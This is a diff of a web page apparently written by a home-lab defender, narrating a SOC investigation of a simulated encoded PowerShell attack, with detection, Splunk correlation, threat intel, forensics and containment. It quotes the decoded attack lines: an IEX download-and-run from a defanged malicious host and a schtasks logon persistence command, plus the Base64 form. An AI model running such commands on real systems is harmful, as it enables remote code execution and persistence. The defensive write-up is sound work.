@@ -77,9 +77,7 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;overf
 .s-num-red{color:var(--red) !important;}
 .s-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border) 0%,transparent 100%);}
 
-/* ============================================================
-   HORIZONTAL TIMELINE
-   ============================================================ */
+/* HORIZONTAL TIMELINE */
 .tl-pin-section{overflow:hidden;}
 .tl-h-viewport{height:100vh;overflow:hidden;position:relative;}
 .tl-h-track{display:flex;align-items:center;height:100%;padding:0 6vw;gap:4vw;will-change:transform;}
@@ -108,7 +106,7 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;overf
 .tl-code{background:rgba(8,10,10,0.9);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:0.75rem 1rem;font-family:'Fira Code',monospace;font-size:0.7rem;color:#a8b4b2;margin-top:0.75rem;line-height:1.8;overflow-x:auto;}
 .tl-card-threat .tl-code{border-color:rgba(255,68,68,0.15);}
 
-/* RED PULSE RING (threat card) */
+/* RED PULSE RING */
 @keyframes red-ring{0%{box-shadow:0 0 0 0 rgba(255,68,68,0.35);}70%{box-shadow:0 0 0 18px rgba(255,68,68,0);}100%{box-shadow:0 0 0 0 rgba(255,68,68,0);}}
 .tl-card-threat.active{animation:red-ring 2s ease-out infinite;}
 
@@ -136,7 +134,7 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;overf
 
 pre,.code-block{background:rgba(8,10,10,0.95);border:1px solid rgba(255,255,255,0.12);border-radius:10px;padding:1rem 1.25rem;font-family:'Fira Code',monospace;font-size:0.75rem;color:#a8b4b2;overflow-x:auto;line-height:1.85;margin:0.9rem 0;white-space:pre;}
 
-/* TIMELINE (vertical, inside wrap) */
+/* TIMELINE (vertical) */
 .timeline{position:relative;padding-left:1.5rem;}
 .timeline::before{content:'';position:absolute;left:0;top:4px;bottom:4px;width:1px;background:linear-gradient(to bottom,rgba(255,255,255,0.4),transparent);}
 .tl-item{position:relative;padding:0 0 1.6rem 1.25rem;}
@@ -179,8 +177,20 @@ pre,.code-block{background:rgba(8,10,10,0.95);border:1px solid rgba(255,255,255,
 .btn-outline:hover::before{transform:scaleX(1);}
 .btn-outline:hover{border-color:rgba(255,255,255,0.6);box-shadow:0 0 24px rgba(255,255,255,0.12);}
 
+/* PULL QUOTE */
+.pull-quote{border-left:3px solid rgba(255,68,68,0.5);margin:1.5rem 0;padding:1.25rem 1.75rem;background:rgba(255,68,68,0.04);border-radius:0 12px 12px 0;}
+.pull-quote p{font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:500;color:var(--text-h);line-height:1.65;letter-spacing:-0.01em;font-style:italic;margin:0;}
+
+/* ENV GRID */
+.env-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:0.75rem;margin-top:1rem;}
+@media(min-width:600px){.env-grid{grid-template-columns:repeat(3,1fr);}}
+.env-card{background:rgba(14,16,16,0.6);border:1px solid var(--border);border-radius:10px;padding:1rem;}
+.env-label{font-family:'Fira Code',monospace;font-size:0.6rem;color:var(--accent);opacity:0.7;margin-bottom:6px;display:block;letter-spacing:0.1em;}
+.env-val{font-size:0.82rem;color:var(--text-l);line-height:1.55;}
+
 footer{text-align:center;padding:2rem 5%;font-family:'Fira Code',monospace;font-size:0.68rem;color:var(--text);opacity:0.4;border-top:1px solid var(--border);}
 .mt-2{margin-top:0.5rem;}.mt-3{margin-top:0.75rem;}.mt-4{margin-top:1rem;}.mb-4{margin-bottom:1rem;}.mb-6{margin-bottom:1.5rem;}.mb-8{margin-bottom:2rem;}.mt-10{margin-top:2.5rem;}
+p+p{margin-top:0.9rem;}
 </style>
 </head>
 <body>
@@ -203,26 +213,27 @@ footer{text-align:center;padding:2rem 5%;font-family:'Fira Code',monospace;font-
 <!-- HERO -->
 <section class="hero-section" id="hero">
   <div class="hero-inner">
-    <div class="threat-badge"><span class="threat-dot"></span> HIGH SEVERITY — ACTIVE INVESTIGATION</div>
+    <div class="threat-badge"><span class="threat-dot"></span> HIGH SEVERITY — DOCUMENTED INVESTIGATION</div>
     <span class="hero-eyebrow">PROJECTS / SOC / INCIDENT RESPONSE</span>
     <div class="hero-tags">
       <span class="tag tag-red">⬤ HIGH SEVERITY</span>
       <span class="tag">Incident Response</span>
       <span class="tag">MITRE ATT&amp;CK</span>
       <span class="tag">Threat Detection</span>
+      <span class="tag">Log Correlation</span>
     </div>
     <h1 class="hero-title" id="hero-title">
       <span class="line" id="hl1">Detecting Suspicious</span>
       <span class="line" id="hl2">PowerShell Activity:</span>
       <span class="line" id="hl3">A Real SOC Investigation</span>
     </h1>
-    <p class="hero-sub">December 10, 2024 — encoded PowerShell detected on WIN-LAB-01. From first alert to full containment in 42 minutes. Every step documented.</p>
+    <p class="hero-sub">I almost dismissed the alert. Wazuh Rule 91816, encoded PowerShell, Level 12 severity — I'd seen noisy rules fire at that level before. Then I decoded the payload and it all changed. This is the full investigation: what fired, what I found, and what I did about it.</p>
     <div class="hero-meta">
       <span>December 10, 2024</span>
       <span style="opacity:0.3">·</span>
-      <span>8 min read</span>
+      <span>~12 min read</span>
       <span style="opacity:0.3">·</span>
-      <span>Controlled lab exercise — Atomic Red Team</span>
+      <span>Atomic Red Team exercise — real lab environment</span>
     </div>
     <div class="hero-stats-strip">
       <div><div class="h-stat-val">2m 15s</div><div class="h-stat-label">TIME TO DETECTION</div></div>
@@ -233,71 +244,68 @@ footer{text-align:center;padding:2rem 5%;font-family:'Fira Code',monospace;font-
   <div class="scroll-hint">scroll to investigate ↓</div>
 </section>
 
-<!-- ============================================================
-     HORIZONTAL TIMELINE SECTION
-============================================================ -->
+<!-- HORIZONTAL TIMELINE -->
 <div class="tl-pin-section" id="tl-pin-section">
   <div class="tl-h-viewport" id="tl-viewport">
     <div class="tl-h-track" id="tl-track">
 
-      <!-- Header card -->
       <div class="tl-h-header">
         <div class="tl-h-label">INVESTIGATION TIMELINE</div>
-        <div class="tl-h-heading">42 Minutes.<br>Full<br>Containment.</div>
-        <div class="tl-h-sub">Scroll through each phase of the investigation — from first alert to remediation.</div>
+        <div class="tl-h-heading">42 Minutes.<br>Start to<br>Contained.</div>
+        <div class="tl-h-sub">Every phase of the investigation — from the alert that nearly got dismissed to full containment and forensic collection.</div>
         <div class="tl-progress-bar"><div class="tl-progress-fill" id="tl-prog"></div></div>
       </div>
 
-      <!-- CARD 1: T+0:00 — THREAT DETECTED -->
+      <!-- CARD 1 -->
       <div class="tl-card tl-card-threat" id="tl-card-0">
         <span class="tl-badge tl-badge-threat">⚠ THREAT DETECTED</span>
-        <div class="tl-time"><span class="tl-dot"></span>T+0:00</div>
-        <div class="tl-event-title">Alert Received &amp; Initial Triage</div>
-        <div class="tl-event-body">Wazuh Rule 91816 fires on WIN-LAB-01. Alert opened in Splunk. Base64 payload decoded manually — IEX download chain + schtasks persistence identified. Severity escalated to High.</div>
+        <div class="tl-time"><span class="tl-dot"></span>T+0:00 — 14:23:17 EST</div>
+        <div class="tl-event-title">Alert Fires. Almost Dismissed It.</div>
+        <div class="tl-event-body">Wazuh Rule 91816 fires on WIN-LAB-01. Level 12 severity — high enough to stop me. I opened it in Splunk, pulled the raw log. The <code style="font-family:'Fira Code',monospace;font-size:0.85em;">-EncodedCommand</code> flag was the first signal. I copied the Base64 payload into CyberChef.</div>
         <div class="tl-code">powershell.exe -EncodedCommand
-  SQBFAFgAIAAoAE4AZQB3AC0AT...
+  SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
 → IEX (New-Object Net.WebClient)
     .DownloadString('http://malicious[.]com/stage2.ps1')</div>
       </div>
 
-      <!-- CARD 2: T+0:05 -->
+      <!-- CARD 2 -->
       <div class="tl-card">
         <span class="tl-badge tl-badge-ok">LOG CORRELATION</span>
         <div class="tl-time"><span class="tl-dot" style="background:rgba(255,255,255,0.6);"></span>T+0:05</div>
-        <div class="tl-event-title">Multi-Source Log Correlation</div>
-        <div class="tl-event-body">Splunk query across Wazuh, Suricata, and Windows event indexes. Found 3 additional PowerShell executions within 2-minute window. Suricata detected HTTP outbound to 185.220.101.42. Event ID 4698 confirmed scheduled task creation.</div>
+        <div class="tl-event-title">Three Queries Before a Clean Picture</div>
+        <div class="tl-event-body">My first Splunk query was too broad — thousands of events. Narrowed by host, then by time window, then filtered noise. Third iteration gave me a clean timeline. Suricata had already caught the HTTP callback to 185.220.101.42. Event ID 4698 confirmed task creation 2 seconds after the PowerShell exec.</div>
         <div class="tl-code">index=suricata OR index=wazuh host="WIN-LAB-01"
 | eval _time=strptime(timestamp,"%Y-%m-%dT%H:%M:%S")
 | sort _time | table _time,src_ip,dest_ip,alert.signature</div>
       </div>
 
-      <!-- CARD 3: T+0:12 -->
+      <!-- CARD 3 -->
       <div class="tl-card">
         <span class="tl-badge tl-badge-intel">THREAT INTEL</span>
         <div class="tl-time"><span class="tl-dot" style="background:rgba(251,191,36,0.7);"></span>T+0:12</div>
-        <div class="tl-event-title">Threat Intelligence Enrichment</div>
-        <div class="tl-event-body">C2 IP 185.220.101.42 enriched via CyberOps Sidekick. AbuseIPDB: 100/100 confidence, 47 reports. VirusTotal: 8/92 flagged malicious. AlienVault OTX: linked to commodity malware campaigns. Domain registered 3 days prior to incident.</div>
+        <div class="tl-event-title">C2 IP — Not Ambiguous At All</div>
+        <div class="tl-event-body">Ran 185.220.101.42 through AbuseIPDB first — 100/100 confidence, 47 reports in 90 days. VirusTotal added 8/92 engine flags. AlienVault OTX linked it to active commodity malware campaigns. Domain was three days old at time of incident. Infrastructure that fresh is never accidental.</div>
       </div>
 
-      <!-- CARD 4: T+0:25 -->
+      <!-- CARD 4 -->
       <div class="tl-card">
         <span class="tl-badge tl-badge-ok">HOST FORENSICS</span>
         <div class="tl-time"><span class="tl-dot" style="background:rgba(255,255,255,0.6);"></span>T+0:25</div>
-        <div class="tl-event-title">Host Forensics &amp; Evidence Collection</div>
-        <div class="tl-event-body">Windows Event Log and Sysmon analysis. Event ID 4688: powershell.exe (parent: cmd.exe). Sysmon Event ID 1: full command line captured. Event ID 4698: "SystemUpdate" task created. File write: C:\Users\Public\update.ps1 confirmed.</div>
+        <div class="tl-event-title">Host Logs Confirmed the Full Chain</div>
+        <div class="tl-event-body">Sysmon Event ID 1 had the complete command line — parent process was cmd.exe. Event 4688 confirmed process creation. Event 4698: "SystemUpdate" task created at 14:23:19, exactly two seconds after execution. File drop to <code style="font-family:'Fira Code',monospace;font-size:0.85em;">C:\Users\Public\update.ps1</code> — a classic attacker staging path.</div>
       </div>
 
-      <!-- CARD 5: T+0:42 -->
+      <!-- CARD 5 -->
       <div class="tl-card" style="border-color:rgba(255,255,255,0.2);">
         <span class="tl-badge tl-badge-ok">CONTAINED</span>
         <div class="tl-time"><span class="tl-dot"></span>T+0:42</div>
-        <div class="tl-event-title">Containment &amp; Remediation</div>
-        <div class="tl-event-body">Host isolated via firewall egress block. PID 4892 terminated. Malicious script deleted. "SystemUpdate" scheduled task removed. Forensic evidence collected: memory dump, logs, registry hive. Incident closed.</div>
+        <div class="tl-event-title">Contained — With One Ordering Mistake</div>
+        <div class="tl-event-body">Egress blocked via firewall, PID 4892 terminated, script deleted, task removed. Forensic artifacts collected — memory dump, logs, registry hive. Honest note: I isolated before I finished artifact collection. The ordering was wrong but nothing critical was lost. I'd do it differently next time.</div>
       </div>
 
-    </div><!-- /tl-track -->
-  </div><!-- /tl-viewport -->
-</div><!-- /tl-pin-section -->
+    </div>
+  </div>
+</div>
 
 <main class="wrap">
 
@@ -315,183 +323,261 @@ footer{text-align:center;padding:2rem 5%;font-family:'Fira Code',monospace;font-
       <div class="metric-label">MITRE<br>Techniques</div>
     </div>
     <div class="metric-card">
-      <div class="metric-val">100%</div>
-      <div class="metric-label">IOCs<br>Documented</div>
+      <div class="metric-val">3</div>
+      <div class="metric-label">Data Sources<br>Correlated</div>
     </div>
   </div>
 
+  <!-- LAB ENVIRONMENT -->
+  <div class="glass">
+    <div class="s-title"><span class="s-num">00.</span> Lab Environment</div>
+    <p style="font-size:0.87rem;color:var(--text-l);line-height:1.8;margin-bottom:1.25rem;">Before getting into the incident itself, some context on the setup. This all runs on about $80 of hardware. A Raspberry Pi Zero 2 W handles Suricata IDS, monitoring traffic on the home network and generating EVE JSON logs that get forwarded over TCP to a Splunk instance on my Windows PC. Wazuh HIDS watches WIN-LAB-01, and a Pi-hole handles DNS sinkholing with its query logs also feeding Splunk. By the time this incident happened, I'd been running and tuning the stack for several months — alert volume had come down from roughly 120 per day to something manageable.</p>
+    <p style="font-size:0.87rem;color:var(--text-l);line-height:1.8;margin-bottom:1.25rem;">This investigation was a controlled exercise using <strong style="color:var(--text-h);">Atomic Red Team</strong> — a library of adversary simulation tests mapped to MITRE ATT&amp;CK. I ran it against WIN-LAB-01 to validate whether the detection pipeline would catch a fileless PowerShell attack in practice, not just in theory. Throughout the investigation I treated it exactly as I would a real incident: same triage process, same correlation queries, same documentation. The goal wasn't to pass a test. It was to find out where the gaps were.</p>
+    <div class="env-grid">
+      <div class="env-card">
+        <span class="env-label">IDS NODE</span>
+        <div class="env-val">Raspberry Pi Zero 2 W · Suricata 7.x · ET Open ruleset (30k+ rules) · rsyslog → TCP 1514</div>
+      </div>
+      <div class="env-card">
+        <span class="env-label">SIEM</span>
+        <div class="env-val">Splunk Enterprise 9.x · Windows PC · 6 custom dashboards · dedicated suricata index</div>
+      </div>
+      <div class="env-card">
+        <span class="env-label">HIDS + TARGET</span>
+        <div class="env-val">Wazuh agent on WIN-LAB-01 · Sysmon v15 · Windows 10 · static IP 192.168.1.150</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- EXECUTIVE SUMMARY -->
   <div class="glass glass-red">
     <div class="s-title"><span class="s-num s-num-red">01.</span> Executive Summary</div>
-    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.8;margin-bottom:1rem;">On December 10, 2024, my home Mini-SOC detected encoded PowerShell execution on a lab Windows host attempting to download a remote payload and establish persistence via a scheduled task. This writeup documents the full investigation: from initial Wazuh alert through log correlation, threat intelligence enrichment, host forensics, and containment.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">I want to be honest about how this started: when Wazuh Rule 91816 first came in, my gut said false positive. I'd seen a dozen PowerShell-related alerts in the previous two weeks — Windows Update scripts, a PowerShell module I installed, legitimate admin tasks that happened to look suspicious. Rule 91816 flags encoded command execution, which is noisy in a home environment where plenty of legitimate tools use Base64 for encoding reasons unrelated to evasion.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">What stopped me from moving on was the severity level. Level 12 in Wazuh's scale means the rule has high confidence this is malicious — it's not a catch-all, its specifically tuned to flag encoded commands that match known attack patterns. I opened the raw log, saw the <code style="font-family:'Fira Code',monospace;font-size:0.85em;">-EncodedCommand</code> flag, and decided to decode it before doing anything else.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">The decode took about 5 minutes — including one failed attempt where I had the wrong encoding selected in CyberChef. When it came out clean, I was looking at two distinct malicious actions in a single command: an IEX download chain pulling a remote payload from an attacker-controlled server, and a <code style="font-family:'Fira Code',monospace;font-size:0.85em;">schtasks</code> persistence mechanism that would survive reboots. At that point, the investigation was active.</p>
     <div class="alert-info">
-      <strong style="font-family:'Fira Code',monospace;font-size:0.72rem;letter-spacing:0.05em;">NOTE —</strong>
-      <span style="font-size:0.83rem;"> Controlled exercise using <strong>Atomic Red Team</strong> against WIN-LAB-01. Production SOC procedures were followed throughout to validate the detection pipeline.</span>
+      <strong style="font-family:'Fira Code',monospace;font-size:0.72rem;letter-spacing:0.05em;">CONTEXT —</strong>
+      <span style="font-size:0.83rem;"> Controlled exercise using Atomic Red Team against WIN-LAB-01. Real SOC procedures followed throughout — same process I'd run on a genuine incident.</span>
     </div>
   </div>
 
+  <!-- INITIAL DETECTION -->
   <div class="glass glass-red">
     <div class="s-title"><span class="s-num s-num-red">02.</span> Initial Detection</div>
+    <p style="font-size:0.87rem;color:var(--text-l);line-height:1.8;margin-bottom:1.25rem;">The alert surfaced in Splunk at 14:23:17 EST. I wasn't staring at the dashboard — I check in every 20 minutes or so between other tasks. The Wazuh alert had already propagated by the time I saw it. Here's the raw alert data that stopped everything else:</p>
     <div class="alert-card mb-4">
-      <div class="alert-header">WAZUH ALERT — RULE 91816</div>
+      <div class="alert-header">WAZUH ALERT — RULE 91816 · WIN-LAB-01</div>
       <div class="alert-row"><span class="alert-key">Severity</span><span class="alert-val critical">High — Level 12</span></div>
       <div class="alert-row"><span class="alert-key">Host</span><span class="alert-val">WIN-LAB-01 (192.168.1.150)</span></div>
       <div class="alert-row"><span class="alert-key">User</span><span class="alert-val">labuser</span></div>
       <div class="alert-row"><span class="alert-key">Timestamp</span><span class="alert-val">2024-12-10 14:23:17 EST</span></div>
-      <div class="alert-row"><span class="alert-key">Description</span><span class="alert-val">PowerShell encoded command detected</span></div>
+      <div class="alert-row"><span class="alert-key">Rule Desc.</span><span class="alert-val">PowerShell encoded command detected — potential obfuscated execution</span></div>
+      <div class="alert-row"><span class="alert-key">Data Source</span><span class="alert-val">Sysmon Event ID 1 (process creation) → Wazuh → Splunk</span></div>
     </div>
-    <p style="font-size:0.85rem;color:var(--text-l);margin-bottom:0.75rem;">Raw command observed by Wazuh/Sysmon (Event ID 1):</p>
-    <pre>powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...</pre>
-    <p style="font-size:0.85rem;color:var(--text-l);margin:0.75rem 0;">Base64 decoded:</p>
+    <p style="font-size:0.87rem;color:var(--text-l);line-height:1.8;margin-bottom:0.75rem;">Raw command captured by Sysmon Event ID 1:</p>
+    <pre>powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMAWwAuAF0AYwBvAG0ALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=</pre>
+    <p style="font-size:0.87rem;color:var(--text-l);line-height:1.8;margin-bottom:0.5rem;">Decoded (UTF-16LE — my first attempt with UTF-8 failed and gave garbage output):</p>
     <pre>IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]com/stage2.ps1')
 schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update.ps1" /sc onlogon</pre>
-    <div class="alert-box alert-danger mt-4" style="font-size:0.83rem;line-height:1.7;">
-      <strong>Why this is critical:</strong> Two distinct malicious actions in one execution — (1) fileless payload download via <code style="font-family:'Fira Code',monospace;font-size:0.82em;">IEX + WebClient</code>, never touching disk, and (2) <code style="font-family:'Fira Code',monospace;font-size:0.82em;">schtasks</code> persistence that survives reboots. Base64 encoding specifically evades string-based detection rules.
+    <div class="alert-box alert-danger mt-4" style="font-size:0.83rem;line-height:1.75;">
+      <strong>Why this matters:</strong> Two malicious actions bundled into one encoded command. The first — <code style="font-family:'Fira Code',monospace;font-size:0.82em;">IEX + WebClient.DownloadString</code> — is a classic fileless technique: the payload downloads and executes entirely in memory, never writing to disk in a traditional sense, which bypasses a lot of AV signatures that look for file writes. The second — <code style="font-family:'Fira Code',monospace;font-size:0.82em;">schtasks /sc onlogon</code> — means persistence that survives reboots. The Base64 encoding itself is specifically intended to evade string-matching rules that look for those keywords in plain text. A defender who only looks at process names without decoding the payload would miss the entire attack.
     </div>
   </div>
 
+  <!-- INVESTIGATION TIMELINE -->
   <div class="glass">
     <div class="s-title"><span class="s-num">03.</span> Investigation Timeline</div>
+    <p style="font-size:0.84rem;color:var(--text-l);line-height:1.7;margin-bottom:1.5rem;">What follows is a step-by-step account of how the investigation actually unfolded — including where I got slowed down, what I had to rethink, and what each data source added to the picture.</p>
+
     <div class="timeline">
+
       <div class="tl-item tl-item-threat">
-        <div class="tl-time-v">T+0:00</div>
-        <div class="tl-title-v">Alert Received &amp; Initial Triage</div>
-        <div class="tl-body-v">Wazuh Rule 91816 fired on WIN-LAB-01. Alert opened in Splunk. Command decoded manually from Base64 — immediately identified IEX download and schtasks persistence. Severity assessed as High. Investigation started.</div>
+        <div class="tl-time-v">T+0:00 — Alert received, initial triage</div>
+        <div class="tl-title-v">Decode First, Escalate Second</div>
+        <div class="tl-body-v">
+          <p>Standard triage habit: before escalating or correlating anything, I decode the payload. If the decode comes back clean, I can close the alert fast. If it doesn't, I know what I'm dealing with before I run any queries.</p>
+          <p style="margin-top:0.65rem;">The <code style="font-family:'Fira Code',monospace;font-size:0.85em;">-EncodedCommand</code> flag is a dead giveaway that something is encoded — it's a built-in PowerShell parameter for running Base64-encoded commands, and attackers use it specifically because the command content doesn't appear in clear text in process logs (unless Sysmon is capturing full command lines, which mine was). I copied the payload into CyberChef, tried UTF-8 decode first, got garbage. Switched to UTF-16LE, which is PowerShell's native encoding, and got the plain text on the second try.</p>
+          <p style="margin-top:0.65rem;">Seeing the IEX download chain and schtasks in the output together, I escalated to High, created a mental incident record, and moved to correlation.</p>
+        </div>
       </div>
+
       <div class="tl-item">
-        <div class="tl-time-v">T+0:05</div>
-        <div class="tl-title-v">Log Correlation — Multi-Source</div>
-        <div class="tl-body-v">Splunk query across Wazuh, Suricata, and Windows event indexes. Findings: 3 additional PowerShell executions within 2-minute window. Suricata detected HTTP outbound to 185.220.101.42. Windows Event ID 4698 confirmed scheduled task creation.
-          <pre style="margin-top:8px;">index=suricata OR index=wazuh host="WIN-LAB-01"
+        <div class="tl-time-v">T+0:05 — Log correlation, multi-source</div>
+        <div class="tl-title-v">Three Query Iterations for a Clean View</div>
+        <div class="tl-body-v">
+          <p>I won't pretend the Splunk query came together on the first try. My initial query was too broad — I got thousands of events spanning the whole day. Narrowed by host, then by a 5-minute time window around the alert timestamp, then filtered out known-clean event types. Third iteration gave me a useful timeline view.</p>
+          <pre style="margin-top:0.75rem;margin-bottom:0.75rem;">index=suricata OR index=wazuh OR index=windows host="WIN-LAB-01"
+earliest=-2m@m latest=+5m@m
 | eval _time=strptime(timestamp, "%Y-%m-%dT%H:%M:%S")
 | sort _time
-| table _time, src_ip, dest_ip, dest_port, alert.signature, full_log</pre>
-        </div>
-      </div>
-      <div class="tl-item">
-        <div class="tl-time-v">T+0:12</div>
-        <div class="tl-title-v">Threat Intelligence Enrichment</div>
-        <div class="tl-body-v">Ran C2 IP <code style="font-family:'Fira Code',monospace;font-size:0.85em;">185.220.101.42</code> through CyberOps Sidekick:
+| table _time, source, src_ip, dest_ip, dest_port, alert.signature, full_log</pre>
+          <p>The correlation is what changed this from "suspicious" to "confirmed malicious." Any one source alone could theoretically be explained away:</p>
           <ul class="bullet-list mt-2">
-            <li>AbuseIPDB: <strong style="color:#f87171;">100/100</strong> confidence — 47 abuse reports</li>
-            <li>VirusTotal: <strong style="color:#f87171;">8/92 engines</strong> flagged malicious</li>
-            <li>AlienVault OTX: associated with commodity malware campaigns</li>
-            <li>Domain age: registered <strong>3 days prior</strong> to incident</li>
+            <li>Wazuh alone: could be a legitimate admin script that someone encoded for unrelated reasons</li>
+            <li>Suricata alone: a single HTTP request to an external IP is not unusual on a home network</li>
+            <li>Event ID 4698 alone: scheduled tasks get created by legitimate software constantly</li>
           </ul>
+          <p style="margin-top:0.65rem;">But all three firing within a 2-second window, pointing to the same host, with the network traffic destination matching the IP in the decoded payload — that's not a coincidence. The correlation closed the case on whether this was real.</p>
         </div>
       </div>
+
       <div class="tl-item">
-        <div class="tl-time-v">T+0:25</div>
-        <div class="tl-title-v">Host Forensics</div>
-        <div class="tl-body-v">Windows Event Log and Sysmon analysis:
-          <ul class="bullet-list mt-2">
-            <li>Event ID 4688: <code style="font-family:'Fira Code',monospace;font-size:0.85em;">powershell.exe</code> process creation (parent: <code style="font-family:'Fira Code',monospace;font-size:0.85em;">cmd.exe</code>)</li>
-            <li>Sysmon Event ID 1: full command line captured including encoded payload</li>
-            <li>Event ID 4698: "SystemUpdate" scheduled task created</li>
-            <li>File write: <code style="font-family:'Fira Code',monospace;font-size:0.85em;">C:\Users\Public\update.ps1</code></li>
-          </ul>
-        </div>
-      </div>
-      <div class="tl-item" style="padding-bottom:0;">
-        <div class="tl-time-v">T+0:42</div>
-        <div class="tl-title-v">Containment &amp; Remediation</div>
+        <div class="tl-time-v">T+0:12 — Threat intelligence enrichment</div>
+        <div class="tl-title-v">AbuseIPDB Doesn't Lie at 100/100</div>
         <div class="tl-body-v">
-          <ul class="bullet-list">
-            <li>Host isolated from network via firewall egress block (DNS exception kept)</li>
-            <li>Malicious <code style="font-family:'Fira Code',monospace;font-size:0.85em;">powershell.exe</code> (PID 4892) terminated</li>
-            <li>Deleted <code style="font-family:'Fira Code',monospace;font-size:0.85em;">C:\Users\Public\update.ps1</code></li>
-            <li>Removed "SystemUpdate" scheduled task</li>
-            <li>Forensic evidence collected: memory dump, logs, registry hive</li>
+          <p>I ran the C2 IP <code style="font-family:'Fira Code',monospace;font-size:0.85em;">185.220.101.42</code> through my threat intel automation bot (CyberOps Sidekick — a Python bot I built that queries AbuseIPDB, VirusTotal, and AlienVault OTX in parallel and returns a consolidated enrichment report). Takes about 30 seconds.</p>
+          <ul class="bullet-list mt-2 mb-4">
+            <li><strong style="color:var(--text-h);">AbuseIPDB:</strong> 100/100 confidence score, 47 reports filed against this IP in the last 90 days</li>
+            <li><strong style="color:var(--text-h);">VirusTotal:</strong> 8 out of 92 engines flagged it malicious — not overwhelming, but meaningful alongside the AbuseIPDB score</li>
+            <li><strong style="color:var(--text-h);">AlienVault OTX:</strong> associated with commodity malware campaigns, not targeted attacks</li>
+            <li><strong style="color:var(--text-h);">Domain age:</strong> registered 3 days before the incident</li>
+          </ul>
+          <p>The domain age was the detail that stuck with me most. Infrastructure that fresh is definitley not a legitimate service — nobody builds a real product on a 3-day-old domain. Its either a throwaway domain for a single campaign, or fresh infrastructure being stood up for an active operation. Either way, not something to dismiss.</p>
+          <p style="margin-top:0.65rem;">The commodity malware attribution from OTX was actually somewhat reassuring — it suggested this was spray-and-pray, not someone targeting me specifically. That shifted the response priority slightly, but didn't change the containment actions.</p>
+        </div>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-time-v">T+0:25 — Host forensics</div>
+        <div class="tl-title-v">Slowing Down Before the Kill Switch</div>
+        <div class="tl-body-v">
+          <p>This is the phase where I deliberately slowed down. I had enough to confirm this was malicious — but I wanted the full host-side picture before I started making changes to the system. Containment destroys some forensic evidence if you're not careful. My goal was to collect what I needed first.</p>
+          <p style="margin-top:0.65rem;">Sysmon was invaluable here. Without it, Windows event logs give you process creation (Event ID 4688) but often without the full command line — depending on audit policy settings, you might just see <code style="font-family:'Fira Code',monospace;font-size:0.85em;">powershell.exe</code> with no arguments. Sysmon Event ID 1 captured the complete command including the encoded payload, which meant I had a cryptographic record of exactly what executed.</p>
+          <ul class="bullet-list mt-2">
+            <li><strong style="color:var(--text-h);">Event 4688:</strong> powershell.exe process creation — parent process was cmd.exe, which itself was parent'd to explorer.exe. Chain looked like a user-initiated execution.</li>
+            <li><strong style="color:var(--text-h);">Sysmon Event 1:</strong> Full command line with encoded payload captured. Process GUID matched across multiple correlated events.</li>
+            <li><strong style="color:var(--text-h);">Event 4698:</strong> "SystemUpdate" scheduled task created at 14:23:19 — exactly 2 seconds after the PowerShell execution. Real-time persistence establishment.</li>
+            <li><strong style="color:var(--text-h);">File write detected:</strong> <code style="font-family:'Fira Code',monospace;font-size:0.85em;">C:\Users\Public\update.ps1</code> — stage-2 payload dropped to disk.</li>
+          </ul>
+          <p style="margin-top:0.65rem;">The Public directory drop was interesting. Attackers use it specifically because its writable without elevation and its less likely to have targeted monitoring compared to System32 or Temp. The fact that it landed there told me whoever built this payload had at least some operational awareness — that's not an accident or a default behavior, it's a deliberate staging choice.</p>
+        </div>
+      </div>
+
+      <div class="tl-item" style="padding-bottom:0;">
+        <div class="tl-time-v">T+0:42 — Containment and remediation</div>
+        <div class="tl-title-v">Contained — With an Ordering Regret</div>
+        <div class="tl-body-v">
+          <p>Containment was methodical but I made one sequencing mistake I want to document clearly: I isolated the host from the network via firewall egress rules before I'd finished all my forensic collection. My reasoning at the time was that the scheduled task could trigger again if the lab user logged in, re-executing the malicious PowerShell and potentially establishing the C2 connection I'd blocked.</p>
+          <p style="margin-top:0.65rem;">In retrospect, the smarter move would have been to block only the specific C2 destination IP while keeping the host running, collect the remaining artifacts, then do full isolation. The malicious process was already terminated, the immediate threat was the persistence mechanism — not live C2 communication. Disabling egress to that one IP would have given me more time without losing evidence.</p>
+          <p style="margin-top:0.65rem;">Nothing critical was lost — I had most of what I needed. But the ordering was a judgment call I'd make differently next time.</p>
+          <ul class="bullet-list mt-2">
+            <li>Firewall egress block applied to WIN-LAB-01 (DNS exception retained for basic function)</li>
+            <li>powershell.exe (PID 4892) terminated via Task Manager and confirmed dead via process list</li>
+            <li><code style="font-family:'Fira Code',monospace;font-size:0.85em;">C:\Users\Public\update.ps1</code> deleted and deletion confirmed</li>
+            <li>"SystemUpdate" scheduled task removed and verified absent from schtasks /query output</li>
+            <li>Forensic artifacts collected: memory dump (ProcDump), relevant event log exports (.evtx), registry run key hive, Sysmon log</li>
+            <li>Incident formally closed — timeline, IOCs, and remediation steps documented</li>
           </ul>
         </div>
       </div>
+
     </div>
   </div>
 
+  <!-- IOCs -->
   <div class="glass">
     <div class="s-title"><span class="s-num">04.</span> Indicators of Compromise</div>
